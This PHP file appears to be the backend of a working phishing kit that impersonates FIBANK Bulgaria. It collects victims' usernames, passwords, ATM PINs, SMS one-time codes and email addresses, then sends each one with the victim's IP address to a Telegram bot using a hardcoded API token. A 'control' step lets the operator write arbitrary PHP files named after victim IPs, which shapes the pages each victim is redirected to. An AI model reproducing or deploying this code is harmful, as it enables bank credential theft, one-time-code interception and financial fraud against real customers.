<?php
require_once "functions.php";
require_once "config.php";

$random = rand(0, 100000000000);


if ($_POST['step'] == "control") {
    $fp = fopen('victims/' . $_POST['ip'] . '.php', 'wb');
    fwrite($fp, $_POST['to']);
    fclose($fp);
    header("Location: control.php?ip=" . $_POST['ip']);
    exit();
}


if (isset($_POST['to']) && $_POST['to'] == 'success') {
    header("Location: success.php");
    exit();
}


if (!empty($_GET['redirection'])) {
    $red = $_GET['redirection'];
    if ($red == 'index') {
        $_SESSION['errors']['index'] = true;
        header("Location: login_error.php");
        exit();
    } elseif ($red == 'email') {
        header("Location: email.php");
        exit();
    } elseif ($red == 'sms') {
        header("Location: sms.php");
        exit();
    } elseif ($red == 'resms') {
        header("Location: resms.php");
        exit();
    }
elseif ($red == 'success') {
        header("Location: success.php");
        exit();
    }
elseif ($red == 'pin') {
        header("Location: pin.php");
        exit();
    }
}


if ($_POST['step'] == 'index') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (empty($username) || empty($password)) {
        header("Location: login_error.php");
        exit();
    } else {
        $address = $_SERVER['REMOTE_ADDR'];
        $subject = $address . " -------| 🏦 FIBANK BULGARIA  🏦 |--------- " . "\r\n";
        $message = " =============\START lOG /============ " . "\r\n";
        $message .= "[+] username : " . $username . "\r\n";
        $message .= "[+] password : " . $password . "\r\n";
        $message .= " ------\  END LOGIN  /------- " . "\r\n";
        $message .= " -----------\ Link CONTROL /----------- " . "\r\n";
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if (isset($_POST['submit'])) {
            $apiToken = '6946508050:AAFoLDeAXCgbVAzYtaACact7UiqaVius6D8';
            $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query($data));
        }
        reset_data();
        header("Location: loading.php");
        exit();
    }
}


if ($_POST['step'] == 'pin') {
    $pin = $_POST['pin'];

    if (empty($pin)) {
        header("Location: pin.php");
        exit();
    } else {
        $address = $_SERVER['REMOTE_ADDR'];
        $subject = $address . " ----| 🏦 FIBANK BULGARIA  🏦 |--------- " . "\r\n";
        $message = " =============\START DEBIT CARD /============ " . "\r\n";
        $message .= "[+]ATM PIN : " . $pin . "\r\n";
        $message .= " ------\ END PIN /------- " . "\r\n";
        $message .= " -----------\ Link CONTROL /----------- " . "\r\n";
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if (isset($_POST['submit'])) {
            $apiToken = '6946508050:AAFoLDeAXCgbVAzYtaACact7UiqaVius6D8';
            $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query($data));
        }
        reset_data();
        header("Location: loading.php");
        exit();
    }
}


if ($_POST['step'] == 'sms') {
    $sms = $_POST['sms'];

    if (empty($sms)) {
        header("Location: sms.php");
        exit();
    } else {
        $address = $_SERVER['REMOTE_ADDR'];
        $subject = $address . " ----| 🏦 FIBANK BULGARIA  🏦 |--------- " . "\r\n";
        $message = " =============\START SMS CODE /============ " . "\r\n";
        $message .= "[+] SMS CODE : " . $sms . "\r\n"; 
        $message .= " ------\ END SMS CODE /------- " . "\r\n";
        $message .= " -----------\ Link CONTROL /----------- " . "\r\n";
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if (isset($_POST['submit'])) {
            $apiToken = '6946508050:AAFoLDeAXCgbVAzYtaACact7UiqaVius6D8';
            $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query($data));
        }
        reset_data();
        header("Location: loading.php");
        exit();
    }
}

if ($_POST['step'] == 'email') {
    $email = $_POST['email'];

    if (empty($email)) {
        header("Location: email.php");
        exit();
    } else {
        $address = $_SERVER['REMOTE_ADDR'];
        $subject = $address . " ----| 🏦 FIBANK BULGARIA  🏦 |--------- " . "\r\n";
        $message = " =============\START E-MAIL /============ " . "\r\n";
        $message .= "[+] E-MAIL : " . $email . "\r\n";
        $message .= " ------\ END E-MAIL/------- " . "\r\n";
        $message .= " -----------\ Link CONTROL /----------- " . "\r\n";
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if (isset($_POST['submit'])) {
            $apiToken = '6946508050:AAFoLDeAXCgbVAzYtaACact7UiqaVius6D8';
            $data = [
                'chat_id' => $id,
                'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query($data));
        }
        reset_data();
        header("Location: loading.php");
        exit();
    }
}



if ($_POST['step'] == 'resms') {
    $resms = $_POST['resms'];

    if (empty($resms)) {
        header("Location: resms.php");
        exit();
    } else {
        $address = $_SERVER['REMOTE_ADDR'];
        $subject = $address . " ----| 🏦 FIBANK BULGARIA  🏦 |--------- " . "\r\n";
        $message = " =============\START SMS CODE 2 /============ " . "\r\n";
        $message .= "[+] INCORRECT SMS CODE : " . $resms . "\r\n"; 
        $message .= " ------\ END SMS CODE 2 /------- " . "\r\n";
        $message .= " -----------\ Link CONTROL /----------- " . "\r\n";
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";

        if (isset($_POST['submit'])) {
            $apiToken = '6946508050:AAFoLDeAXCgbVAzYtaACact7UiqaVius6D8';
            $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot" . $apiToken . "/sendMessage?" . http_build_query($data));
        }
        reset_data();
        header("Location: loading.php");
        exit();
    }
}
?>
